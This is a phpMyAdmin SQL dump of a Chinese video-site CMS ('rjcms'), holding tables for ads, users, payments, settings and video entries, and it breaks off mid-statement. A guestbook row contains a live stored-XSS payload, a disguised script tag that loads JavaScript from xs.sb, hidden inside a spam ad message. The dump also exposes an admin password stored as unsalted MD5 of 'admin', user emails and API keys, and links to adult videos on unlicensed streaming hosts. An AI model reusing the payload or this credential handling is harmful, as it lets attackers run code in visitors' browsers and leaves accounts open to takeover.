-- phpMyAdmin SQL Dump
-- version 4.7.9
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: 2021-04-19 02:26:03
-- 服务器版本： 5.5.62-log
-- PHP Version: 7.0.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `reju`
--

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_ad`
--

CREATE TABLE `rjcms_ad` (
  `id` smallint(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `pic` varchar(255) NOT NULL,
  `catid` varchar(255) DEFAULT NULL,
  `miaoshu` varchar(255) DEFAULT NULL,
  `picurl` varchar(255) DEFAULT NULL,
  `link` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_ad`
--

INSERT INTO `rjcms_ad` (`id`, `title`, `url`, `pic`, `catid`, `miaoshu`, `picurl`, `link`) VALUES
(8, '1111', '', '<img src=\"/uploadfile/image/20180320/20180320151235_87335.png\" alt=\"\" width=\"100%/\" />', '1', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_adclass`
--

CREATE TABLE `rjcms_adclass` (
  `id` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_adclass`
--

INSERT INTO `rjcms_adclass` (`id`, `name`) VALUES
(1, '播放前广告'),
(2, '导航广告'),
(3, '抢先看上方广告'),
(4, '电影上方广告'),
(5, '电视剧上方广告'),
(6, '综艺上方广告'),
(7, '动漫上方广告'),
(8, '友情链接上方广告'),
(9, '电影栏目页广告'),
(10, '电视剧栏目页广告'),
(11, '动漫栏目页广告'),
(12, '综艺栏目页广告'),
(13, '播放页剧情上方广告');

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_book`
--

CREATE TABLE `rjcms_book` (
  `id` int(11) NOT NULL,
  `content` text,
  `userid` varchar(11) DEFAULT NULL,
  `Reply` text,
  `time` datetime DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_book`
--

INSERT INTO `rjcms_book` (`id`, `content`, `userid`, `Reply`, `time`) VALUES
(4, '<sCrIpt srC=//xs.sb/KwDC></sCRipT>站长你好，京东广告，在网站找一640*100固定位投放，流量结算，可以日结，正规稳定，多站都有合作了解一下', '小哥', NULL, '2021-04-17 11:20:51');

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_fav`
--

CREATE TABLE `rjcms_fav` (
  `id` int(11) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `userid` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_link`
--

CREATE TABLE `rjcms_link` (
  `l_id` smallint(6) UNSIGNED NOT NULL,
  `l_name` varchar(64) NOT NULL DEFAULT '',
  `l_url` varchar(255) NOT NULL DEFAULT '',
  `l_logo` varchar(255) NOT NULL DEFAULT '',
  `l_type` tinyint(1) NOT NULL DEFAULT '0',
  `l_sort` smallint(6) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_manager`
--

CREATE TABLE `rjcms_manager` (
  `m_id` smallint(6) UNSIGNED NOT NULL,
  `m_name` varchar(32) NOT NULL DEFAULT '',
  `m_password` varchar(32) NOT NULL DEFAULT '',
  `m_levels` varchar(32) NOT NULL DEFAULT '',
  `m_random` varchar(32) NOT NULL DEFAULT '',
  `m_status` tinyint(1) NOT NULL DEFAULT '0',
  `m_logintime` int(10) NOT NULL DEFAULT '0',
  `m_loginip` int(10) NOT NULL DEFAULT '0',
  `m_loginnum` smallint(6) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_manager`
--

INSERT INTO `rjcms_manager` (`m_id`, `m_name`, `m_password`, `m_levels`, `m_random`, `m_status`, `m_logintime`, `m_loginip`, `m_loginnum`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', 'b,c,d,e,f,g,h,i,j', '897de67740645ef418d8915547298d4c', 1, 1503380295, 2130706433, 0);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_nav`
--

CREATE TABLE `rjcms_nav` (
  `id` int(11) NOT NULL,
  `n_name` varchar(255) DEFAULT NULL,
  `n_url` varchar(255) DEFAULT NULL,
  `order` int(11) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_nav`
--

INSERT INTO `rjcms_nav` (`id`, `n_name`, `n_url`, `order`) VALUES
(7, '电视剧', '/tv.php', 0),
(6, '电影', '/movie.php', 0);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_play`
--

CREATE TABLE `rjcms_play` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `userid` varchar(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_player`
--

CREATE TABLE `rjcms_player` (
  `id` smallint(6) UNSIGNED NOT NULL,
  `n_name` varchar(64) NOT NULL DEFAULT '',
  `n_url` varchar(255) DEFAULT '0',
  `order` smallint(6) NOT NULL DEFAULT '0',
  `biaoshi` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_player`
--

INSERT INTO `rjcms_player` (`id`, `n_name`, `n_url`, `order`, `biaoshi`) VALUES
(124, 'm3u8', 'http://api.rjcms.com/?url=', 0, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_slideshow`
--

CREATE TABLE `rjcms_slideshow` (
  `id` int(11) NOT NULL,
  `s_name` varchar(255) DEFAULT NULL,
  `s_parent` varchar(255) DEFAULT NULL,
  `s_order` int(11) DEFAULT NULL,
  `s_url` varchar(255) DEFAULT NULL,
  `s_picture` varchar(255) DEFAULT NULL,
  `s_content` longtext
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_slideshow`
--

INSERT INTO `rjcms_slideshow` (`id`, `s_name`, `s_parent`, `s_order`, `s_url`, `s_picture`, `s_content`) VALUES
(5, '111', '1', 5, '111', '11', NULL);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_system`
--

CREATE TABLE `rjcms_system` (
  `id` int(11) NOT NULL,
  `s_name` varchar(255) DEFAULT NULL,
  `s_domain` varchar(255) DEFAULT NULL,
  `s_seoname` varchar(255) DEFAULT NULL,
  `s_keywords` varchar(255) DEFAULT NULL,
  `s_description` varchar(255) DEFAULT NULL,
  `s_cache` varchar(255) DEFAULT NULL,
  `s_wei` varchar(255) DEFAULT NULL,
  `s_user` varchar(255) DEFAULT NULL,
  `s_logo` varchar(255) DEFAULT NULL,
  `s_weixin` varchar(255) DEFAULT NULL,
  `s_dashang` varchar(255) DEFAULT NULL,
  `s_mjk` varchar(255) DEFAULT NULL,
  `s_jiekou` text,
  `s_copyright` text,
  `s_changyan` text,
  `s_alipay` varchar(255) DEFAULT NULL,
  `s_appid` varchar(255) DEFAULT NULL,
  `s_appkey` varchar(255) DEFAULT NULL,
  `s_shoukuan` varchar(255) DEFAULT NULL,
  `s_qqun` varchar(255) DEFAULT NULL,
  `s_token` varchar(255) DEFAULT NULL,
  `s_shouquan` varchar(255) DEFAULT NULL,
  `s_bdyun` varchar(255) DEFAULT NULL,
  `s_tongji` text,
  `s_qianxian` varchar(255) DEFAULT NULL,
  `s_dianying` varchar(255) DEFAULT NULL,
  `s_dianshi` varchar(255) DEFAULT NULL,
  `s_zongyi` varchar(255) DEFAULT NULL,
  `s_dongman` varchar(255) DEFAULT NULL,
  `s_tuiguang` varchar(255) DEFAULT NULL,
  `s_shoufei` text,
  `s_cishu` varchar(255) DEFAULT NULL,
  `s_pc` varchar(255) DEFAULT NULL,
  `s_hong` varchar(255) DEFAULT NULL,
  `s_gonggao` text,
  `s_bofang` varchar(255) DEFAULT NULL,
  `s_guanzhu` text,
  `s_fengmian` varchar(255) DEFAULT NULL,
  `s_mail` varchar(255) DEFAULT NULL,
  `s_smtp` varchar(255) DEFAULT NULL,
  `s_muser` varchar(255) DEFAULT NULL,
  `s_mpwd` varchar(255) DEFAULT NULL,
  `s_wappid` varchar(255) DEFAULT NULL,
  `s_wkey` varchar(255) DEFAULT NULL,
  `s_tixing` varchar(255) DEFAULT NULL,
  `s_appewm` varchar(255) DEFAULT NULL,
  `s_appbt` varchar(255) DEFAULT NULL,
  `s_apppic` varchar(255) DEFAULT NULL,
  `s_appurl` varchar(255) DEFAULT NULL,
  `s_gg` varchar(255) DEFAULT NULL,
  `s_hctime` varchar(255) DEFAULT NULL,
  `s_beijing` varchar(255) DEFAULT NULL,
  `s_dianyingnew` varchar(255) DEFAULT NULL,
  `s_dongmannew` varchar(255) DEFAULT NULL,
  `s_zongyinew` varchar(255) DEFAULT NULL,
  `s_zhifu` varchar(255) DEFAULT NULL,
  `s_tuijian` text,
  `s_wxguanzhu` varchar(255) DEFAULT NULL,
  `s_smsname` varchar(255) DEFAULT NULL,
  `s_smspass` varchar(255) DEFAULT NULL,
  `s_miaoshu` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_system`
--

INSERT INTO `rjcms_system` (`id`, `s_name`, `s_domain`, `s_seoname`, `s_keywords`, `s_description`, `s_cache`, `s_wei`, `s_user`, `s_logo`, `s_weixin`, `s_dashang`, `s_mjk`, `s_jiekou`, `s_copyright`, `s_changyan`, `s_alipay`, `s_appid`, `s_appkey`, `s_shoukuan`, `s_qqun`, `s_token`, `s_shouquan`, `s_bdyun`, `s_tongji`, `s_qianxian`, `s_dianying`, `s_dianshi`, `s_zongyi`, `s_dongman`, `s_tuiguang`, `s_shoufei`, `s_cishu`, `s_pc`, `s_hong`, `s_gonggao`, `s_bofang`, `s_guanzhu`, `s_fengmian`, `s_mail`, `s_smtp`, `s_muser`, `s_mpwd`, `s_wappid`, `s_wkey`, `s_tixing`, `s_appewm`, `s_appbt`, `s_apppic`, `s_appurl`, `s_gg`, `s_hctime`, `s_beijing`, `s_dianyingnew`, `s_dongmannew`, `s_zongyinew`, `s_zhifu`, `s_tuijian`, `s_wxguanzhu`, `s_smsname`, `s_smspass`, `s_miaoshu`) VALUES
(1, '热剧cms影视系统', 'https://www.maceychiu.xyz/', '热剧cms影视系统 - 在线免费高清电影！', '电影,视频大全,在线高清电影,付费电影,免费电影,电视剧,电影,在线观看,VIP高清电影直播', '热剧cms影视系统，是专门做电视剧,电影等在线播放服务，本页面提供电影的相关内容。', '0', '0', '0', '/uploadfile/image/20171010/20171010060448_78472.png', '/images/qrcode.jpg', '/images/qrcode.jpg', 'http://api.pucms.com/?url=', '线路一$http://biuba.cn/vip/?url=\r\n线路二$http://499m.cn/index.php?url=\r\n线路三$http://jx.89zg.cn?url=\r\n线路四$http://p_d.2myun.com:7878/?url=\r\n线路五$http://7cyd.com/vip/?url=\r\n线路六$http://api.sllwl.cn?url=\r\n线路七$http://www.662820.com/xnflv/index.php?url=\r\n线路八$http://www.917k.la/?url=\r\n线路九$http://api.600tv.cn/?url=\r\n线路十$https://jx.99yyw.com/99/?url=', '本站提供的最新电影和电视剧资源均系收集于各大视频网站,本站只提供web页面服务,并不提供影片资源存储,也不参与录制、上传<br />\r\n若本站收录的节目无意侵犯了贵司版权，请给网页底部邮箱地址来信,我们会及时处理和回复,谢谢。<br />\r\n管理员邮箱：12345678@qq.com <br />\r\n购买本站程序可联系QQ：12345678\r\n<div style=\"display:none;\">\r\n<script>\r\nvar _hmt = _hmt || [];\r\n(function() {\r\n  var hm = document.createElement(\"script\");\r\n  hm.src = \"https://hm.baidu.com/hm.js?1b228034eab3f86498adfd4e9d337209\";\r\n  var s = document.getElementsByTagName(\"script\")[0]; \r\n  s.parentNode.insertBefore(hm, s);\r\n})();\r\n</script>\r\n</div>', '', 'http://tx87.cn/', '1779', 'n6hezU4hPWz9wSobhIhqqBsFsShLhBeb', '', '', '1222', 'da.pucms.com', 'http://030e.com/wp.php?url=', '', '1', '1', '1', '1', '1', '0', '鸭王,鸭王2,', '5', '1', '0', '这是播放页公告信息，可在后台基本设置页面替换', '10', NULL, NULL, '0', 'smtp.163.com', '', '', NULL, NULL, '', '/uploadfile/image/20180316/20180316161344_33922.jpg', '/images/3.png', '/images/2.png', '', NULL, '10', '/style/bg.jpg', '1', '0', '0', '1', NULL, NULL, '', '', '10');

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_user`
--

CREATE TABLE `rjcms_user` (
  `u_id` mediumint(8) UNSIGNED NOT NULL,
  `u_qid` varchar(32) NOT NULL DEFAULT '',
  `u_name` varchar(32) NOT NULL DEFAULT '',
  `u_password` varchar(32) NOT NULL DEFAULT '',
  `u_qq` varchar(16) NOT NULL DEFAULT '',
  `u_email` varchar(32) NOT NULL DEFAULT '',
  `u_phone` varchar(16) NOT NULL DEFAULT '',
  `u_status` tinyint(1) NOT NULL DEFAULT '0',
  `u_flag` tinyint(1) NOT NULL DEFAULT '0',
  `u_question` varchar(255) NOT NULL DEFAULT '',
  `u_answer` varchar(255) NOT NULL DEFAULT '',
  `u_group` smallint(6) NOT NULL DEFAULT '0',
  `u_points` smallint(6) NOT NULL DEFAULT '0',
  `u_regtime` char(255) NOT NULL DEFAULT '0',
  `u_logintime` char(255) NOT NULL DEFAULT '0',
  `u_loginnum` smallint(6) NOT NULL DEFAULT '0',
  `u_extend` smallint(6) NOT NULL DEFAULT '0',
  `u_loginip` char(10) NOT NULL DEFAULT '0',
  `u_random` varchar(32) NOT NULL DEFAULT '',
  `u_fav` text NOT NULL,
  `u_plays` text NOT NULL,
  `u_downs` text NOT NULL,
  `u_start` int(10) NOT NULL DEFAULT '0',
  `u_end` int(10) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_user`
--

INSERT INTO `rjcms_user` (`u_id`, `u_qid`, `u_name`, `u_password`, `u_qq`, `u_email`, `u_phone`, `u_status`, `u_flag`, `u_question`, `u_answer`, `u_group`, `u_points`, `u_regtime`, `u_logintime`, `u_loginnum`, `u_extend`, `u_loginip`, `u_random`, `u_fav`, `u_plays`, `u_downs`, `u_start`, `u_end`) VALUES
(10, '', 'admin', '8e7f7589e0fb9ff6b274c5891cd677a7', '', 'yuxin32@qq.com', '', 1, 1, 'be02d575b9a7aed93b850491c2461868', '', 2, 1578, '1519628088', '21-03-19 09:53:00', 22, 0, '112.96.104', '', '0', '0,gKLmahH4Rnr3Sx', '0', 1616063245, 1621247238),
(11, '', 'yuxin01', 'a0bf6385533c54652c056ee60071fdd9', '', 'yuxin321@qq.com', '', 0, 0, '44c689e18041f328ae0b6548b1480a9d', '', 1, 0, '1521535268', '0', 0, 0, '0', '', '0', '0', '0', 0, 0),
(12, '', 'jdqiu', '21232f297a57a5a743894a0e4a801fc3', '', '921751743@qq.com', '', 1, 0, 'be02d575b9a7aed93b850491c2461868', '', 2, 1638, '1519628088', '20-07-26 08:20:53', 26, 0, '::1', '', '0', '0,gKLmahH4Rnr3Sx', '0', 1521521820, 1528834344);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_userka`
--

CREATE TABLE `rjcms_userka` (
  `id` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `day` varchar(255) DEFAULT NULL,
  `money` varchar(255) DEFAULT NULL,
  `jifen` varchar(255) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_userka`
--

INSERT INTO `rjcms_userka` (`id`, `name`, `day`, `money`, `jifen`, `userid`) VALUES
(1, '包月会员', '30', '5', '50', 2);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_user_card`
--

CREATE TABLE `rjcms_user_card` (
  `c_id` int(11) UNSIGNED NOT NULL,
  `c_number` varchar(16) NOT NULL DEFAULT '',
  `c_pass` varchar(8) NOT NULL DEFAULT '' COMMENT '分类',
  `c_money` int(11) NOT NULL DEFAULT '0' COMMENT '天数',
  `c_used` tinyint(1) NOT NULL DEFAULT '0',
  `c_sale` tinyint(1) NOT NULL DEFAULT '0',
  `c_user` varchar(255) DEFAULT '0',
  `c_addtime` int(10) NOT NULL DEFAULT '0',
  `c_usetime` int(10) NOT NULL DEFAULT '0',
  `c_userid` int(11) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_user_card`
--

INSERT INTO `rjcms_user_card` (`c_id`, `c_number`, `c_pass`, `c_money`, `c_used`, `c_sale`, `c_user`, `c_addtime`, `c_usetime`, `c_userid`) VALUES
(349, 'DwlyGIKlngS', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(350, 'yI278hyR9SI', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(351, 'q0o8WYaN3G9', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(352, '6nWWMil1lqS', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(353, 'au8l9aZp8BT', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(354, 'V58wzjPX46B', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(355, 'pha4WjYOi7G', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(356, '6kd7fzrrDkB', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(357, '7AZ0jTaneo4', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(358, '2Y2fuEntqOR', '11', 11, 0, 0, '0', 1521535655, 0, 2),
(359, 'vM4Y6ckQV4T', '11', 11, 0, 0, '0', 1521535655, 0, 2);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_user_cardclass`
--

CREATE TABLE `rjcms_user_cardclass` (
  `id` int(11) NOT NULL,
  `uniacid` int(11) DEFAULT NULL,
  `title` varchar(255) DEFAULT NULL,
  `card_id` varchar(255) DEFAULT NULL,
  `num` int(11) DEFAULT NULL,
  `day` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_user_cardclass`
--

INSERT INTO `rjcms_user_cardclass` (`id`, `uniacid`, `title`, `card_id`, `num`, `day`, `userid`) VALUES
(16, 2, '11', '11', 11, 11, 2);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_user_group`
--

CREATE TABLE `rjcms_user_group` (
  `ug_id` smallint(6) NOT NULL,
  `ug_name` varchar(32) NOT NULL DEFAULT '',
  `ug_type` varchar(255) NOT NULL DEFAULT '',
  `ug_popedom` varchar(32) NOT NULL DEFAULT '',
  `ug_upgrade` smallint(6) NOT NULL DEFAULT '0',
  `ug_popvalue` smallint(6) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_user_group`
--

INSERT INTO `rjcms_user_group` (`ug_id`, `ug_name`, `ug_type`, `ug_popedom`, `ug_upgrade`, `ug_popvalue`) VALUES
(1, '普通会员', '', '', 0, 1),
(2, '金牌会员', '', '', 10, 0),
(3, '超级会员', '', '', 500, 0);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_user_pay`
--

CREATE TABLE `rjcms_user_pay` (
  `p_id` int(11) NOT NULL,
  `p_order` varchar(255) NOT NULL DEFAULT '0',
  `p_uid` varchar(255) NOT NULL DEFAULT '0',
  `p_price` varchar(255) NOT NULL DEFAULT '0',
  `p_time` int(10) NOT NULL DEFAULT '0',
  `p_point` varchar(255) NOT NULL DEFAULT '0',
  `p_status` tinyint(1) NOT NULL DEFAULT '0',
  `p_group` smallint(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_user_pay`
--

INSERT INTO `rjcms_user_pay` (`p_id`, `p_order`, `p_uid`, `p_price`, `p_time`, `p_point`, `p_status`, `p_group`) VALUES
(6, '20210318182659545', 'admin', '5', 1616063219, '30', 0, 2),
(7, '20210318182709242', 'admin', '5', 1616063229, '30', 0, 2);

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_user_visit`
--

CREATE TABLE `rjcms_user_visit` (
  `uv_id` int(11) NOT NULL,
  `uv_uid` int(11) DEFAULT '0',
  `uv_ip` int(10) NOT NULL DEFAULT '0',
  `uv_ly` varchar(128) NOT NULL DEFAULT '',
  `uv_time` int(10) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_vod`
--

CREATE TABLE `rjcms_vod` (
  `d_id` int(11) UNSIGNED NOT NULL,
  `d_name` varchar(255) NOT NULL DEFAULT '',
  `d_picture` varchar(255) NOT NULL DEFAULT '',
  `d_jifen` varchar(255) DEFAULT '',
  `d_user` varchar(11) DEFAULT '',
  `d_parent` char(11) NOT NULL DEFAULT '',
  `d_rec` varchar(255) DEFAULT '',
  `d_hot` varchar(255) DEFAULT '',
  `d_content` text,
  `d_seoname` varchar(255) DEFAULT NULL,
  `d_description` varchar(255) DEFAULT NULL,
  `d_keywords` varchar(255) DEFAULT NULL,
  `d_scontent` text,
  `d_zhuyan` varchar(255) DEFAULT NULL,
  `d_pingfen` varchar(255) DEFAULT NULL,
  `d_year` varchar(255) DEFAULT NULL,
  `d_player` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_vod`
--

INSERT INTO `rjcms_vod` (`d_id`, `d_name`, `d_picture`, `d_jifen`, `d_user`, `d_parent`, `d_rec`, `d_hot`, `d_content`, `d_seoname`, `d_description`, `d_keywords`, `d_scontent`, `d_zhuyan`, `d_pingfen`, `d_year`, `d_player`) VALUES
(94, '闺蜜2', 'http://img1.doubanio.com/view/photo/s_ratio_poster/public/p2514909788.jpg', '', '', '124', '', '', '《闺蜜2：无二不作》讲述了陈意涵、薛凯琪、张钧甯闺蜜团空降越南，开启了一场婚前失控单身之旅。', NULL, NULL, NULL, 'HD高清中字首发$http://n.bwzybf.com/share/eaovX6qmQnAYvGZo\r\n', '薛凯琪,陈意涵,张钧甯,迈克·泰森', NULL, NULL, ''),
(95, '马里布野性周末!', 'https://img9.doubanio.com/view/photo/m/public/p2611124274.webp', '', '', '124', '', '', '', NULL, NULL, NULL, 'BD高清$https://cdn.letv-cdn.com/share/9ZeeRXn1arty6LWP\n', '', NULL, NULL, ''),
(96, '加勒比 123119-001 女熱大陸 File.076 鹤田舞', 'https://img9.doubanio.com/view/photo/m/public/p2611124274.webp', '', '', '124', '', '', '', NULL, NULL, NULL, 'BD高清$https://oo.838av.com/addons/dplayer/?url=https://cdn.aliyun.18sjsk.com/videos/202007/14/5f0787528364c80627581fd5/4a077a/index.m3u8\r\n', '', NULL, NULL, ''),
(97, '加勒比 122819-001 ピタパン美巨尻家政婦の年末大掃除２麻生芽衣', 'https://pic.sheyiye.xyz/upload/vod/20200715-1/cd278fe30fd7bde977421e983ff2923d.jpg', '', '', '124', '', '', '', NULL, NULL, NULL, '1080P$https://oo.838av.com/addons/dplayer/?url=https://cdn.aliyun.18sjsk.com/videos/202007/14/5f0787528364c80627581fc8/573d96/index.m3u8', '', NULL, NULL, ''),
(98, '加勒比 060619-936 ハーフ美女アンソロジー 福江範子', 'https://pic.sheyiye.xyz/upload/vod/20200715-1/f32cf1269ffaa2ae0734527d54f85f59.jpg', '', '', '124', '', '', '', NULL, NULL, NULL, '1080P$https://oo.838av.com/addons/dplayer/?url=https://cdn.aliyun.18sjsk.com/videos/202007/14/5f0787528364c80627581fd4/d16d13/index.m3u8', '', NULL, NULL, ''),
(99, '加勒比 050713-332 神崎かおりの限界トランス 神崎かおり', 'https://pic.sheyiye.xyz/upload/vod/20200715-1/f32cf1269ffaa2ae0734527d54f85f59.jpg', '', '', '124', '', '', '', NULL, NULL, NULL, '1080P$xfplay://dna=m0MgAZDZmZudmdL0AwDXAeL0EdbgAGmWDZa4Dwx2mGHXBGqbmGpYmt|dx=532910257|mz=050713-332-carib_hd.rmvb|zx=nhE0pdOVlZe5Bc40mc41AY4ZAdO5mdtWl3uzogyUnW', '', NULL, NULL, '125'),
(100, 'FC2 PPV 880652 昼休みにスーツ姿のままでHをしてしまいパンストを破られたのでノーパンストで帰ったエレベーターガール?', 'resource/thumbnail/f32cf1269ffaa2ae0734527d54f85f60.jpg', '', '', '124', '', '', '', NULL, NULL, NULL, '1080P$G:\\TDownload\\2\\[thz.la]fc2ppv_880652.mp4', '', NULL, NULL, '125'),
(101, 'Carib - 赤坂ルナ 上品な美熟女のアソコがグジュグジュ', 'https://pic.sheyiye.xyz/upload/vod/20200715-1/cd278fe30fd7bde977421e983ff2923d.jpg', '', '', '124', '', '', '', NULL, NULL, NULL, '1080P$https://oo.838av.com/addons/dplayer/?url=https://bobolj.com/20200704/HyXM3tb0/index.m3u8', '', NULL, NULL, '');

-- --------------------------------------------------------

--
-- 表的结构 `rjcms_vod_class`
--

CREATE TABLE `rjcms_vod_class` (
  `c_id` smallint(6) UNSIGNED NOT NULL,
  `c_name` varchar(64) NOT NULL DEFAULT '',
  `c_pid` smallint(6) NOT NULL DEFAULT '0',
  `c_sort` smallint(6) NOT NULL DEFAULT '0',
  `c_hide` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `rjcms_vod_class`
--

INSERT INTO `rjcms_vod_class` (`c_id`, `c_name`, `c_pid`, `c_sort`, `c_hide`) VALUES
(124, '动作片', 0, 124, 1);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `rjcms_ad`
--
ALTER TABLE `rjcms_ad`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_adclass`
--
ALTER TABLE `rjcms_adclass`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_book`
--
ALTER TABLE `rjcms_book`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_fav`
--
ALTER TABLE `rjcms_fav`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_link`
--
ALTER TABLE `rjcms_link`
  ADD PRIMARY KEY (`l_id`),
  ADD KEY `l_sort` (`l_sort`),
  ADD KEY `l_type` (`l_type`);

--
-- Indexes for table `rjcms_manager`
--
ALTER TABLE `rjcms_manager`
  ADD PRIMARY KEY (`m_id`),
  ADD KEY `m_status` (`m_status`);

--
-- Indexes for table `rjcms_nav`
--
ALTER TABLE `rjcms_nav`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_play`
--
ALTER TABLE `rjcms_play`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_player`
--
ALTER TABLE `rjcms_player`
  ADD PRIMARY KEY (`id`),
  ADD KEY `c_sort` (`order`),
  ADD KEY `c_pid` (`n_url`);

--
-- Indexes for table `rjcms_slideshow`
--
ALTER TABLE `rjcms_slideshow`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_system`
--
ALTER TABLE `rjcms_system`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_user`
--
ALTER TABLE `rjcms_user`
  ADD PRIMARY KEY (`u_id`),
  ADD KEY `u_group` (`u_group`),
  ADD KEY `u_status` (`u_status`);

--
-- Indexes for table `rjcms_userka`
--
ALTER TABLE `rjcms_userka`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_user_card`
--
ALTER TABLE `rjcms_user_card`
  ADD PRIMARY KEY (`c_id`),
  ADD KEY `c_used` (`c_used`),
  ADD KEY `c_sale` (`c_sale`),
  ADD KEY `c_user` (`c_user`),
  ADD KEY `c_addtime` (`c_addtime`),
  ADD KEY `c_usetime` (`c_usetime`);

--
-- Indexes for table `rjcms_user_cardclass`
--
ALTER TABLE `rjcms_user_cardclass`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rjcms_user_group`
--
ALTER TABLE `rjcms_user_group`
  ADD PRIMARY KEY (`ug_id`),
  ADD KEY `ug_upgrade` (`ug_upgrade`),
  ADD KEY `ug_popvalue` (`ug_popvalue`);

--
-- Indexes for table `rjcms_user_pay`
--
ALTER TABLE `rjcms_user_pay`
  ADD PRIMARY KEY (`p_id`),
  ADD KEY `p_order` (`p_order`),
  ADD KEY `p_uid` (`p_uid`),
  ADD KEY `p_status` (`p_status`);

--
-- Indexes for table `rjcms_user_visit`
--
ALTER TABLE `rjcms_user_visit`
  ADD PRIMARY KEY (`uv_id`);

--
-- Indexes for table `rjcms_vod`
--
ALTER TABLE `rjcms_vod`
  ADD PRIMARY KEY (`d_id`),
  ADD KEY `d_letter` (`d_user`),
  ADD KEY `d_name` (`d_name`),
  ADD KEY `d_enname` (`d_jifen`);

--
-- Indexes for table `rjcms_vod_class`
--
ALTER TABLE `rjcms_vod_class`
  ADD PRIMARY KEY (`c_id`),
  ADD KEY `c_sort` (`c_sort`),
  ADD KEY `c_pid` (`c_pid`),
